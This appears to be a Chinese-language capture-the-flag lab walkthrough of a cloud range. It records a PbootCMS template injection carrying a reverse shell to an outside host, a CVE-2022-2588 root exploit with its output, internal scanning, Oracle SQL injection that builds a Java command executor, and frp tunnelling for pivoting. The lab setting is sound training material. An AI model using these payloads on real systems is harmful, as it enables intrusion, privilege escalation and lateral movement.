
![](assets/file-20260529150909917.png)
# flag01
## 登录 39.101.140.137
可能是SQL注入
![697](assets/file-20260529151640215.png)

## 登录39.101.138.52
有PbootCMS，PbootCMS 是一款**永久开源免费、可商用**的轻量级 PHP 企业建站系统，由于是PHP搭建的，尝试寻找漏洞
![](assets/file-20260529151439311.png)

## nmap扫描
对两个IP地址进行nmap扫描 ，第二个有PbootCMS
```
☁  endless  nmap -p- 39.101.140.137
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-29 15:06 CST
Nmap scan report for 39.101.140.137
Host is up (0.070s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
445/tcp  filtered microsoft-ds
5800/tcp filtered vnc-http
5900/tcp filtered vnc

☁  endless  nmap -sVC -p- 39.101.138.52             
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-29 15:09 CST
Nmap scan report for 39.101.138.52
Host is up (0.062s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE    SERVICE      VERSION
22/tcp   open     ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ef:d3:14:1e:f4:c0:95:80:c6:be:63:45:3a:ce:52:18 (RSA)
|   256 0d:6a:13:05:42:49:24:bf:0b:d1:a3:a3:80:12:89:41 (ECDSA)
|_  256 90:ee:16:a1:00:12:1a:e3:be:76:5c:d1:4d:e0:bc:56 (ED25519)
80/tcp   open     http         nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/ad*
|_http-title: PbootCMS-\xE6\xB0\xB8\xE4\xB9\x85\xE5\xBC\x80\xE6\xBA\x90\xE5\x85\x8D\xE8\xB4\xB9\xE7\x9A\x84PHP\xE4\xBC\x81\xE4\xB8\x9A\xE7\xBD\x91\xE7\xAB\x99\xE5\xBC\x80\xE5\x8F\x91\xE5\xBB\xBA\xE8\xAE\xBE\xE7\xAE\xA1\xE7\x90...
445/tcp  filtered microsoft-ds
5800/tcp filtered vnc-http
5900/tcp filtered vnc
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 反弹
https://fushuling.com/index.php/2024/02/10/__trashed/  靶机博客
https://guokeya.github.io/post/WscncUrcS/  漏洞原理
![](assets/file-20260529154404715.png)

完整的Request
```bash
GET /?a=}{pboot{user:password}:if(("sys\x74em")("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 101.132.149.233 1111 >/tmp/f"));//)}xxx{/pboot{user:password}:if} HTTP/1.1
Host: 39.101.138.52
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: lg=cn; PbootSystem=vs69gaa7if3h1s7hs3vq2beq8a
Connection: close
```

稳定shell
```bash
script /dev/null -c bash 
Ctrl+Z 
stty raw -echo; fg 
reset xterm 
export TERM=xterm 
export SHELL=/bin/bash 
stty rows 24 columns 80
```

反弹成功后进入系统，发现flag文件
```
www-data@iZ8vbe81fu56hntkmf5cy5Z:/$ ls -l
total 64
lrwxrwxrwx   1 root root     7 Jul  5  2022 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Jul  5  2022 boot
drwxr-xr-x  17 root root  3860 May 29 15:03 dev
drwxr-xr-x  94 root root  4096 May 29 15:04 etc
-rwxr-xr-x   1 root root    31 Aug  2  2022 flag
drwxr-xr-x   2 root root  4096 Apr 15  2020 home
......
www-data@iZ8vbe81fu56hntkmf5cy5Z:/$ cat flag
flag{Php_Waf_so_insteresting!}
```
###  **flag{Php_Waf_so_insteresting!}**


1. 可以使用 [# CVE-2022-2588]([CVE-2022-2588](https://github.com/Markakd/CVE-2022-2588)) 提权，靶机自带python,可以用阿里云的`python -m http.server 4444`上传, 靶机执行`wget http://xxx.xxx.xxx.xxx:4444/exp_file_credential
2. 记得`chmod 777 ./exp_file_credential` ，否则无法执行
3. 这里不知道为啥第二次才执行成功，提权至root成功
```bash
www-data@iZ8vbe81fu56hntkmf5cy5Z:/tmp$ ls -la
total 80
-rw-r--r--  1 www-data www-data 37136 May 29 15:52 exp_file_credential
www-data@iZ8vbe81fu56hntkmf5cy5Z:/tmp$ chmod 777 ./exp_file_credential
www-data@iZ8vbe81fu56hntkmf5cy5Z:/tmp$ ls -la
total 84
-rwxrwxrwx  1 www-data www-data 37136 May 29 15:52 exp_file_credential

www-data@iZ8vbe81fu56hntkmf5cy5Z:/tmp$ ./exp_file_credential
self path /tmp/./exp_file_credential
prepare done
Old limits -> soft limit= 14096          hard limit= 14096 
starting exploit, num of cores: 2
defrag done
spray 256 done
freed the filter object
256 freed done
double free done
spraying files
found overlap, id : 5, 833
start slow write
closed overlap
got cmd, start spraying /etc/passwd
spray done
should be after the slow write
write done, spent 1.209773 s
succeed
www-data@iZ8vbe81fu56hntkmf5cy5Z:/tmp$ su user
Password: 
# id
uid=0(user) gid=0(root) groups=0(root)
```


### 查看内网IP
```bash
# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.23.4.32  netmask 255.255.0.0  broadcast 172.23.255.255
        inet6 fe80::216:3eff:fe2b:c6a5  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:2b:c6:a5  txqueuelen 1000  (Ethernet)
        RX packets 203413  bytes 184378595 (184.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 94877  bytes 14250800 (14.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2728  bytes 233489 (233.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2728  bytes 233489 (233.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

### fscan扫描
```bash
# chmod 777 ./fscan
# ./fscan -h 172.23.4.32/24

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.23.4.32     is alive
(icmp) Target 172.23.4.51     is alive
(icmp) Target 172.23.4.19     is alive
(icmp) Target 172.23.4.12     is alive
[*] Icmp alive hosts len is: 4
172.23.4.32:22 open
172.23.4.12:445 open
172.23.4.51:445 open
172.23.4.12:139 open
172.23.4.51:139 open
172.23.4.12:135 open
172.23.4.51:135 open
172.23.4.19:80 open
172.23.4.19:22 open
172.23.4.32:80 open
172.23.4.51:1521 open
[*] alive ports len is: 11
start vulscan
[*] NetInfo 
[*]172.23.4.51
   [->]iZ57e7wj3wecclZ
   [->]172.23.4.51
[*] NetInfo 
[*]172.23.4.12
   [->]IZMN9U6ZO3VTRNZ
   [->]172.23.4.12
   [->]172.24.7.16
[*] NetBios 172.23.4.51     WORKGROUP\IZ57E7WJ3WECCLZ     
[*] NetBios 172.23.4.12     PENTEST\IZMN9U6ZO3VTRNZ       
[*] WebTitle http://172.23.4.19        code:200 len:481    title:Search UserInfo
[*] WebTitle http://172.23.4.32        code:200 len:19779  title:PbootCMS-永久开源免费的PHP企业网站开发建设管理系统
[+] PocScan http://172.23.4.32/www.zip poc-yaml-backup-file
[+] PocScan http://172.23.4.32 poc-yaml-pbootcms-database-file-download 
[+] PocScan http://172.23.4.32 poc-yaml-phpstudy-nginx-wrong-resolve php
```

### 扫描结果
```bash
172.23.4.32 pbootcms 
172.23.4.19 站库分离的站 
172.23.4.12 pentest.me域内机器，IZMN9U6ZO3VTRNZ.pentest.me 
172.23.4.51 工作组的IZFMB86ANJMVJ6Z
```

# flag02

参考这篇 [靶机WP博客](https://h0ny.github.io/posts/%E6%97%A0%E9%97%B4%E8%AE%A1%E5%88%92-Endless-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/)




```
GET / HTTP/1.1
Host: 39.101.161.22
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=EAE485C1FEBDE7010D00FCB7025E3B70
Connection: close
Content-Length: 931

name=admin' and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "CommandExecutor" AS
import java.io.*;
public class CommandExecutor {
    public static String execute(String command)  {
        try {
            Process process = Runtime.getRuntime().exec(command);
            InputStream inputStream = process.getInputStream();
            BufferedReader input = new BufferedReader(new InputStreamReader(inputStream, "GBK"));
            String line;
            StringBuilder output = new StringBuilder();
            while ((line = input.readLine()) != null) {
                output.append(line).append("\n");
            }
            input.close();
            return output.toString();

        } catch (Exception e) {
            return e.toString();
        }
    }
}
'';commit;end;') from dual)>1 --

```

```
name=admin' and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''CREATE OR REPLACE FUNCTION execute_command(command IN VARCHAR2) RETURN VARCHAR2 AS LANGUAGE JAVA NAME ''''CommandExecutor.execute(java.lang.String) return java.lang.String''''; '';commit;end;') from dual)>1--


name=admin' union select null,(select execute_command('ipconfig') from dual),null from dual--
```
![](assets/file-20260529165047140.png)


## 搭建frp代理
阿里云已经开放7000端口了，有防火墙还要再次执行`ufw allow 7000/tcp`

### 阿里云服务端
```bash
ecs-user@iZuf6cpbx5hvqmv33pteu2Z /h/frp_0.65.0_linux_amd64> ./frps -c ./frps.toml
2026-06-01 14:36:45.962 [I] [frps/root.go:108] frps uses config file: ./frps.toml
2026-06-01 14:36:46.210 [I] [server/service.go:236] frps tcp listen on 0.0.0.0:7000
2026-06-01 14:36:46.210 [I] [frps/root.go:117] frps started successfully
2026-06-01 14:36:53.186 [I] [server/service.go:582] [5aee9f15ef905c3b] client login info: ip [39.101.143.209:46064] version [0.65.0] hostname [] os [linux] arch [amd64]
2026-06-01 14:36:53.215 [I] [proxy/tcp.go:82] [5aee9f15ef905c3b] [plugin_socks5] tcp proxy listen port [6000]
2026-06-01 14:36:53.215 [I] [server/control.go:399] [5aee9f15ef905c3b] new proxy [plugin_socks5] type [tcp] success
```

### 靶机端（PBOOTCMS）
```bash
www-data@iZ8vbgyjachs4g5pjgaopzZ:/tmp$ chmod 777 ./frpc
www-data@iZ8vbgyjachs4g5pjgaopzZ:/tmp$ chmod 777 ./frpc.toml
www-data@iZ8vbgyjachs4g5pjgaopzZ:/tmp$ ./frpc -c ./frpc.toml
WARNING: ini format is deprecated and the support will be removed in the future, please use yaml/json/toml format instead!
2026-06-01 14:36:53.111 [I] [sub/root.go:149] start frpc service for config file [./frpc.toml]
2026-06-01 14:36:53.111 [I] [client/service.go:325] try to connect to server...
2026-06-01 14:36:53.199 [I] [client/service.go:317] [5aee9f15ef905c3b] login to server success, get run id [5aee9f15ef905c3b]
2026-06-01 14:36:53.199 [I] [proxy/proxy_manager.go:177] [5aee9f15ef905c3b] proxy added: [plugin_socks5]
2026-06-01 14:36:53.228 [I] [client/control.go:172] [5aee9f15ef905c3b] [plugin_socks5] start proxy success
```



![](assets/file-20260529165531264.png)

